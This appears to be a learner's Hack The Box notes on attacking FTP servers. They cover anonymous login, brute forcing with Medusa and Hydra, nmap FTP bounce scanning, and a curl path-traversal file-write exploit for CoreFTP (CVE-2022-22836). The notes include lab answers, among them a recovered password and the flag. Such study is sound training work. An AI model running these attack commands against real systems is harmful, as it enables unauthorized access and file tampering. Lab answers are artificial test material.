By default, FTP listens on port `TCP/21`.
To attack an FTP Server, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities.

## Enumeration

```shell
sudo nmap -sC -sV -p 21 192.168.2.142 
```

## Misconfigurations
As we discussed, anonymous authentication can be configured for different services such as FTP. To access with anonymous login, we can use the `anonymous` username and no password.

Once we get access to an FTP server with anonymous credentials, we can start searching for interesting information. We can use the commands `ls` and `cd` to move around directories like in Linux. To download a single file, we use `get`, and to download multiple files, we can use `mget`. For upload operations, we can use `put` for a simple file or `mput` for multiple files. We can use `help` in the FTP client session for more information.

#### Brute Forcing
There are many different tools to perform a brute-forcing attack. Let us explore one of them, [Medusa](https://github.com/jmk-foofus/medusa). With `Medusa`, we can use the option `-u` to specify a single user to target, or you can use the option `-U` to provide a file with a list of usernames. The option `-P` is for a file containing a list of passwords. We can use the option `-M` and the protocol we are targeting (FTP) and the option `-h` for the target hostname or IP address.

```shell
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```

#### FTP Bounce Attack
An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.

Consider we are targetting an FTP Server `FTP_DMZ` exposed to the internet. Another device within the same network, `Internal_DMZ`, is not exposed to the internet. We can use the connection to the `FTP_DMZ` server to scan `Internal_DMZ` using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.
![[Pasted image 20251018130306.png]]


The `Nmap` -b flag can be used to perform an FTP bounce attack:

```shell
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

10.10.110.213 is FTP server and is internal and not visible host.


### Questions

1. What port is the FTP service running on?
```shell
We found with nmap: 2121/tcp open  ftp
```

2. What username is available for the FTP server?
```shell
> hydra -L users.list -P passwords.list ftp://10.129.203.6:2121 -V
[2121][ftp] host: 10.129.203.6   login: robin   password: 7iz4rnckjsduza7
```

3. Using the credentials obtained earlier, retrieve the flag.txt file. Submit the contents as your answer.
```
HTB{ATT4CK1NG_F7P_53RV1C3}
```



----

# Latest FTP Vulnerabilities
In this case, we will discuss the `CoreFTP before build 727` vulnerability assigned [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836). This vulnerability is for an FTP service that does not correctly process the `HTTP PUT` request and leads to an `authenticated directory`/`path traversal,` and `arbitrary file write` vulnerability. This vulnerability allows us to write files outside the directory to which the service has access.

## The Concept of the Attack
This FTP service uses an HTTP `POST` request to upload files. However, the CoreFTP service allows an HTTP `PUT` request, which we can use to write content to files. Let's have a look at the attack based on our concept. The [exploit](https://www.exploit-db.com/exploits/50652) for this attack is relatively straightforward, based on a single `cURL` command.

#### CoreFTP Exploitation
```shell
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

We create a raw HTTP `PUT` request (`-X PUT`) with basic auth (`--basic -u <username>:<password>`), the path for the file (`--path-as-is https://<IP>/../../../../../whoops`), and its content (`--data-binary "PoC."`) with this command. Additionally, we specify the host header (`-H "Host: <IP>"`) with the IP address of our target system.

In short, the actual process misinterprets the user's input of the path. This leads to access to the restricted folder being bypassed. As a result, the write permissions on the HTTP `PUT` request are not adequately controlled, which leads to us being able to create the files we want outside of the authorized folders. However, we will skip the explanation of the `Basic Auth` process and jump directly to the first part of the exploit.


#### Directory Traversal
| **Step** | **Directory Traversal**                                                                                                                                                                                                                              | **Concept of Attacks - Category** |
| -------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------- |
| `1.`     | The user specifies the type of HTTP request with the file's content, including escaping characters to break out of the restricted area.                                                                                                              | `Source`                          |
| `2.`     | The changed type of HTTP request, file contents, and path entered by the user are taken over and processed by the process.                                                                                                                           | `Process`                         |
| `3.`     | The application checks whether the user is authorized to be in the specified path. Since the restrictions only apply to a specific folder, all permissions granted to it are bypassed as it breaks out of that folder using the directory traversal. | `Privileges`                      |
| `4.`     | The destination is another process that has the task of writing the specified contents of the user on the local system.                                                                                                                              | `Destination`                     |
Up to this point, we have bypassed the constraints imposed by the application using the escape characters (`../../../../`) and come to the second part, where the process writes the contents we specify to a file of our choice. This is when the cycle starts all over again, but this time to write contents to the target system.

#### Arbitrary File Write

| **Step** | **Arbitrary File Write**                                                                                                                            | **Concept of Attacks - Category** |
| -------- | --------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------- |
| `5.`     | The same information that the user entered is used as the source. In this case, the filename (`whoops`) and the contents (`--data-binary "PoC."`).  | `Source`                          |
| `6.`     | The process takes the specified information and proceeds to write the desired content to the specified file.                                        | `Process`                         |
| `7.`     | Since all restrictions were bypassed during the directory traversal vulnerability, the service approves writing the contents to the specified file. | `Privileges`                      |
| `8.`     | The filename specified by the user (`whoops`) with the desired content (`"PoC."`) now serves as the destination on the local system.                | `Destination`                     |

#### Target System
```cmd-session
C:\> type C:\whoops

PoC.
```
